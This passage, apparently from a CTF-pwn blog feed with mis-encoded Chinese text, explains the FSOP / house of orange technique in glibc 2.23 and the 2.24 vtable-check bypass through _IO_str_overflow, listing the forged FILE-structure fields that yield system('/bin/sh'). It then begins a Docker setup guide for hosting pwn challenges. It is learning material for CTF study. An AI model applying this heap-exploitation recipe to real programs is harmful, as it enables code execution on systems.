é“¾è¡¨çš„åˆ©ç”¨æŠ€æœ¯ï¼Œé€šè¿‡è°ƒç”¨_IO_flush_all_lockp()å‡½æ•°è§¦å‘ã€‚è¯¥å‡½æ•°ä¼šåœ¨ä¸‹é¢ä¸‰ç§æƒ…å†µä¸‹è¢«è°ƒç”¨ï¼š</li></ul><ol><li><p>å½“libcæ£€æµ‹åˆ°å†…å­˜é”™è¯¯ä»è€Œæ‰§è¡Œabortæµç¨‹æ—¶ï¼›ğŸ¤¯</p></li><li><p>æ‰§è¡Œexitå‡½æ•°æ—¶ï¼›ğŸ¤¯ğŸ¤¯</p></li><li><p>å½“mainå‡½æ•°è¿”å›æ—¶ã€‚ğŸ¤¯ğŸ¤¯ğŸ¤¯</p></li></ol><ul><li>å½“libcæ£€æŸ¥åˆ°å†…å­˜é”™è¯¯æ—¶ï¼Œä¼šäº§ç”Ÿä¸‹é¢çš„å‡½æ•°è°ƒç”¨è·¯å¾„</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr-&gt;_libc_message-&gt;_GI_abort-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</span><br></pre></td></tr></table></figure></div><h2 id="2-23ç‰ˆæœ¬"><a href="#2-23ç‰ˆæœ¬" class="headerlink" title="2.23ç‰ˆæœ¬"></a>2.23ç‰ˆæœ¬</h2><p>å› æ­¤è¡ç”Ÿå‡ºäº†<code>FSOP</code>ï¼Œé€šè¿‡ä¼ªé€ ã€_IO_jump_tä¸­çš„<code>_overflow</code>ä¸º<code>systemå‡½æ•°åœ°å€</code>ï¼Œæœ€ç»ˆåœ¨<code>_IO_OVERFLOW(fp,EOF)</code>å‡½æ•°ä¸­æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)å¹¶è·å¾—shell.</p><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/genops.c#L759">æºç åœ°å€ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all; <span class="comment">// è¦†ç›–ä¸ºä¼ªé€ çš„é“¾è¡¨</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class="comment">// éœ€è¦ç»•è¿‡è¿™äº›æ£€æŸ¥</span></span><br><span class="line"># æ¡ä»¶ <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="comment">// fpæŒ‡å‘ä¼ªé€ çš„vtableï¼Œè§¦å‘è™šå‡½æ•°</span></span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp = fp-&gt;_chain; <span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ª_IO_FILEå¯¹è±¡</span></span><br><span class="line">    &#125;</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>æ¡ä»¶</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></div><p>è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡_IO_FINISH(fp)çš„æ—¶å€™æ¥è°ƒç”¨ä¼ªé€ çš„system(â€œ&#x2F;bin&#x2F;shâ€)</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);<span class="comment">// fpæŒ‡å‘è™šè¡¨</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="2-24ç‰ˆæœ¬"><a href="#2-24ç‰ˆæœ¬" class="headerlink" title="2.24ç‰ˆæœ¬"></a>2.24ç‰ˆæœ¬</h2><p>è¯¥ç‰ˆæœ¬åŠ å…¥äº†å¯¹vtableçš„è§æ“¦æ±—ï¼Œæ‰€æœ‰çš„<code>vtables</code>éƒ½è¢«æ”¾è¿›äº†<code>__libc_IO_vtables</code>æ®µé‡Œé¢ï¼Œä½¿å¾—ä»–ä»¬åœ¨å†…å­˜ä¸­è¿ç»­ï¼Œåœ¨ä»»ä½•è·³è½¬ä¹‹å‰ï¼Œ<code>vtable</code>æŒ‡é’ˆéƒ½ä¼šè°ƒç”¨<code>IO_validate_vtable()</code>å‡½æ•°è¿›è¡Œè¾¹ç¼˜æ£€æŸ¥ï¼Œå¦‚æœæŒ‡é’ˆä¸åœ¨è¿™ä¸ªæ®µï¼Œé‚£ä¹ˆå°†ä¼šè°ƒç”¨<code>IO_vtable_check()</code>å‡½æ•°è¿›ä¸€æ­¥æ£€æŸ¥ã€‚</p><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L932">æºç åœ°å€ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; <span class="comment">// è¿™ä¸ªæœ‰ä¸ªè¾¹ç¼˜æ£€æŸ¥</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line">    .....</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/strops.c#L326">æºç åœ°å€ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="åˆ©ç”¨-IO-str-jumps"><a href="#åˆ©ç”¨-IO-str-jumps" class="headerlink" title="åˆ©ç”¨_IO_str_jumps"></a>åˆ©ç”¨_IO_str_jumps</h3><p>ç”±äºvtableå¢åŠ äº†checkï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä¿®æ”¹è™šè¡¨æŒ‡å‘_libc_IO_vtablesä»¥å¤–çš„åœ°æ–¹ï¼Œå› æ­¤æˆ‘ä»¬å¾—åœ¨__libc_IO_vtablesé‡Œé¢æ‰¾äº›æœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ¯”å¦‚è¯´_IO_str_jumps</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish), <span class="comment">// åˆ©ç”¨ _IO_str_finish</span></span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow), <span class="comment">// åˆ©ç”¨ _IO_str_overflow</span></span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h4 id="1-åˆ©ç”¨-IO-str-overflow"><a href="#1-åˆ©ç”¨-IO-str-overflow" class="headerlink" title="1.åˆ©ç”¨_IO_str_overflow"></a>1.åˆ©ç”¨_IO_str_overflow</h4><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/strops.c#L81">æºç ç½‘å€ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">// æœ‰è¦æ±‚</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>; <span class="comment">// /bin/shçš„åœ°å€</span></span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); <span class="comment">// systemçš„åœ°å€</span></span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æ„é€ è¦æ±‚å¦‚ä¸‹ï¼š</p><ul><li>fp-&gt;_flag &#x3D; 0 </li><li>fp-&gt;_IO_write_ptr &#x3D; 0xffffffffffffffff</li><li>fp-&gt;_IO_write_base &#x3D; 0</li><li>fp-&gt;_IO_buf_end &#x3D; (str_bin_sh - 100) &#x2F; 2</li></ul><p>æ³¨æ„ï¼šstr_bin_shæœ€å¥½æ˜¯å¶æ•°ï¼Œé¿å…é™¤æ³•å‘ä¸‹å–æ•´ï¼Œå¯ä»¥+1</p><ul><li>fp-&gt;_IO_buf_base &#x3D; 0</li><li>fp-&gt;mode &#x3D; 0</li><li>fp + 0xe0 &#x3D; system_addr</li></ul><p>å¦å¤–ï¼Œsystem(â€œ&#x2F;bin&#x2F;shâ€)å¯ä»¥ç”¨oggä»£æ›¿</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI_IO_str_overflow</span><br></pre></td></tr></table></figure></div></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> å­¦ä¹ èµ„æ–™ </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> house of orange </tag>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå‡ºé¢˜-docker</title>
      <link href="/2024/12/03/PWN%E5%87%BA%E9%A2%98-docker/"/>
      <url>/2024/12/03/PWN%E5%87%BA%E9%A2%98-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¯¥æ–‡ç« ç®€å•ä»‹ç»ä¸€ä¸‹pwnå‡ºé¢˜çš„åŸºæœ¬è¿‡ç¨‹,ä»…é™äºdockeréƒ¨åˆ†,è‡³äºä¼ åˆ°å†™é¢˜ç›®çš„æœåŠ¡å™¨ä¸Šè¿˜æ²¡æµ‹è¯•è¿‡.</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="ç¬¬ä¸€éƒ¨åˆ†-å®‰è£…"><a href="#ç¬¬ä¸€éƒ¨åˆ†-å®‰è£…" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†-å®‰è£…"></a>ç¬¬ä¸€éƒ¨åˆ†-å®‰è£…</h2><p>å¼•è‡ªGPT</p><ul><li>å®‰è£…ç›¸å…³ä¾èµ–</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure></div><ul><li>æ·»åŠ dockerå®˜æ–¹çš„GPGå¯†é’¥</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | <span class="built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure></div><ul><li>æ·»åŠ dockerçš„APTä»“åº“</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure></div><ul><li>æ›´æ–°</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure></div><ul><li>å®‰è£…docker</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker-ce</span><br></pre></td></tr></table></figure></div><ul><li>å¯åŠ¨dockerå¹¶è®¾ç½®ä¸ºå¼€æœºè‡ªå¯</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start docker</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure></div><ul><li>ä»¥érootç”¨æˆ·è¿è¡Œdocker(å¯é€‰,è‹¥ä¸è®¾ç½®æ¯æ¬¡dockerè¦ä»¥sudoå¯åŠ¨)</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br><span class="line"><span class="comment"># ç„¶åé‡æ–°ç™»é™†ä¸€æ¬¡,æˆ–è€…:newgrp docker</span></span><br></pre></td></tr></table></figure></div><ul><li>ç®€å•æµ‹è¯•:</li></ul><div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> hello-world</span></span><br></pre></td></tr></table></figure></div><p>æ•ˆæœ:</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241203132423553.bmp"></p><p>è‹¥æ˜¯ä¸æˆåŠŸå°±è¯´æ˜è¢«å¢™äº†,é 